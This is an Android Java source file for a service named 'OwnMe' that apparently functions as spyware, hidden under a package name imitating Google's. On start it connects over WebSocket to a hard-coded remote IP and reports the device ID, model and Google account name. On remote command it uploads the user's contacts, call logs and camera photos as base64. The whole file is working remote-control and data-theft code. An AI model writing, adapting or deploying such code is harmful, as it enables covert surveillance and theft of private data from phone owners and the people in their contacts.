package com.google.android.network;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

import static android.R.attr.name;

/**
 * Created by earthshakira on 26/1/17.
 */

public class OwnMe extends Service {
    private WebSocketClient mWebSocketClient;
    private String android_id, dev_name;
    private String username;
    private Timer pingpong;
    boolean webopen = false;
    JSONObject ping;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    public String getNetworkState() {
        ConnectivityManager cm =
                (ConnectivityManager) this.getBaseContext().getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        boolean isConnected = activeNetwork != null &&
                activeNetwork.isConnectedOrConnecting();
        if (isConnected) {
            switch (activeNetwork.getType()) {
                case ConnectivityManager.TYPE_WIFI:
                    return "wifi";
                case ConnectivityManager.TYPE_MOBILE:
                    return "mobile_data";
                default:
                    return "other";
            }
        } else return null;
    }

    public void startExploit(Intent intent) {
        String network = getNetworkState();
        if (network != null) {
            Toast.makeText(this.getBaseContext(), network + " network available", Toast.LENGTH_LONG).show();
            connectWebSocket();
        } else {
            Toast.makeText(this.getBaseContext(), "no network stopping self", Toast.LENGTH_LONG).show();
            stopSelf();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(this, "Service Started", Toast.LENGTH_LONG).show();
        pingpong = new Timer();
        username = "super_admin";
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        android_id = telephonyManager.getDeviceId();
        dev_name = Build.MANUFACTURER + " " + Build.MODEL;
        ping = new JSONObject();
        try {
            ping.put("type", "ping");
            ping.put("id", android_id);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        startExploit(intent);
        return Service.START_STICKY;
    }

    @Override
    public boolean stopService(Intent name) {
        Toast.makeText(this.getBaseContext(), "Service Stoped", Toast.LENGTH_LONG).show();
        if (mWebSocketClient != null)
            mWebSocketClient.close();
        else Toast.makeText(this.getBaseContext(), "Web socket is null", Toast.LENGTH_LONG).show();
        return super.stopService(name);
    }


    private void connectWebSocket() {
        URI uri;
        try {
                      uri = new URI("ws://43.228.237.131:8080");
            //uri = new URI("ws://192.168.0.101:8080");
        } catch (URISyntaxException e) {
            e.printStackTrace();
            return;
        }
        Toast.makeText(this.getBaseContext(), " Tying to open ", Toast.LENGTH_LONG).show();
        mWebSocketClient = new WebSocketClient(uri) {
            @Override
            public void onOpen(ServerHandshake serverHandshake) {
                Log.i("Websocket", "Opened");
                mWebSocketClient.send("{\"type\":\"handshake\",\"user\":\"" + username + "\",\"id\":\"" + android_id + "\",\"devname\":\"" + dev_name + "\",\"devuser\":\"" + getUsername() + "\",\"connection\":\"" + getNetworkState() + "\"}");
                webopen = true;

                pingpong.scheduleAtFixedRate(new TimerTask() {
                    @Override
                    public void run() {
                        Log.d("Timer Running", "Is it up");
                        if (webopen) {
                            updateBattery();
                            mWebSocketClient.send(ping.toString());
                        } else {

                        }
                    }
                }, 0, 5000);
                //Toast.makeText(getBaseContext(),"Web socket is on",Toast.LENGTH_LONG).show();
            }

            @Override
            public void onMessage(String s) {

                Log.d("shubham", "onMessage: " + s);

                try {
                    Log.d("shubham", "onMessage: inside try");
                    JSONObject x = new JSONObject(s);
                    Log.d("shubham", "onMessage: " + x.get("cmd"));
                    if (x.get("cmd").toString().equals("screenshot")) {
                        x.put("to", x.get("from"));
                        x.put("response", "none");
                        x.remove("from");
                        x.put("type", "response");
                        mWebSocketClient.send(x.toString());
                        Log.d("shubham", "onMessage: " + x.get("cmd"));
                    } else if (x.get("cmd").toString().equals("contacts")) {
                        x.put("to", x.get("from"));
                        x.put("response", getContacts());
                        x.remove("from");
                        x.put("type", "contacts");
                        mWebSocketClient.send(x.toString());
                    }else if (x.get("cmd").toString().equals("calllog")) {
                        x.put("to", x.get("from"));
                        x.put("response", getCallLogs());
                        x.remove("from");
                        x.put("type", "calllog");
                        mWebSocketClient.send(x.toString());
                    } else if (x.get("cmd").toString().equals("gallery")) {
                        x.put("to", x.get("from"));
                        x.put("response", getGallery());
                        x.remove("from");
                        x.put("type", "gallery");
                        mWebSocketClient.send(x.toString());
                    } else {
                        Log.d("shubham", "no commans found");
                    }
                } catch (JSONException e) {
                    Log.d("shubham", "onMessage: inside catch");
                    e.printStackTrace();

                }

            }

            @Override
            public void onClose(int i, String s, boolean b) {
                Log.i("Websocket", "Closed " + s);
                webopen = false;
                pingpong.cancel();
                pingpong.purge();

            }

            @Override
            public void onError(Exception e) {
                webopen = false;
                pingpong.cancel();
                pingpong.purge();

                Log.i("Websocket", "Error " + e.getMessage());
            }
        };
        mWebSocketClient.connect();
    }

    public String getUsername() {
        AccountManager manager = AccountManager.get(this);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "NO permission", Toast.LENGTH_LONG).show();
        }
        Account[] accounts = manager.getAccountsByType("com.google");
        for (int i = 0; i < accounts.length; i++) {
            return accounts[i].name;
        }

        return null;
    }

    private String getContacts() {

        StringBuilder sb = new StringBuilder();
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor_Android_Contacts = null;
        boolean first = true;
        try {
            cursor_Android_Contacts = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            sb.append("[");
            if (cursor_Android_Contacts.getCount() > 0) {

                while (cursor_Android_Contacts.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    String contact_id = cursor_Android_Contacts.getString(cursor_Android_Contacts.getColumnIndex(ContactsContract.Contacts._ID));
                    String contact_display_name = cursor_Android_Contacts.getString(cursor_Android_Contacts.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    contact.put("id", contact_id);
                    contact.put("name", contact_display_name);
                    ArrayList<String> phones = new ArrayList<>();
                    int hasPhoneNumber = Integer.parseInt(cursor_Android_Contacts.getString(cursor_Android_Contacts.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));
                    if (hasPhoneNumber > 0) {

                        Cursor phoneCursor = contentResolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI
                                , null
                                , ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?"
                                , new String[]{contact_id}
                                , null);

                        while (phoneCursor.moveToNext()) {
                            String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            phones.add(phoneNumber);
                        }
                        phoneCursor.close();
                    }
                    contact.put("phones", phones);
                    if (!first)
                        sb.append(",");
                    sb.append(contact.toString());
                    first = false;
                }

            }
            sb.append("]");
        } catch (Exception ex) {
            Log.e("Error on contact", ex.getMessage());
            return "error:" + ex.getMessage();
        }
        return sb.toString();
    }

    private String getCallLogs() {
        StringBuffer sb = new StringBuffer();
        //Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,null, null, null);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return "No permission";
        }

        Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Details :");
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String phname = managedCursor.getString(name);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append("\nName:"+phname  +"\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            sb.append("\n----------------------------------");
        }
        managedCursor.close();
        return sb.toString();
    }
    private void updateBattery(){
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = getBaseContext().registerReceiver(null, ifilter);
//        // Are we charging / charged?
//        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
//        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
//                status == BatteryManager.BATTERY_STATUS_FULL;
//
//// How are we charging?
//        int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
//        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
//        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        float batteryPct = level / (float)scale * 100;
        try {
            ping.put("battery",batteryPct);
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }
    private String getGallery(){
        String str="";
        File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        File yourDir = new File(dir,"/Camera/");
        Log.d("Shubham",""+yourDir.listFiles());
        JSONObject x = new JSONObject();
        int counter =0 ;
        for (File f : yourDir.listFiles()) {
            if (f.isFile())
            {
                String name = f.getName();
                if(counter<3) {
                    counter++;
                    File img = new File(dir, "/Camera/" + name);
                    Bitmap bm = BitmapFactory.decodeFile(img.getAbsolutePath());
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    bm.compress(Bitmap.CompressFormat.JPEG, 20, baos); //bm is the bitmap object

                    String encodedImage = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
                    try {
                        x.put(("img"+counter),encodedImage);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                    Log.d("Shubham", "fileencoded" +encodedImage);
                }

            }
            Log.d("Shubham", "filenames" + name);

        }

        return x.toString();
    }
}
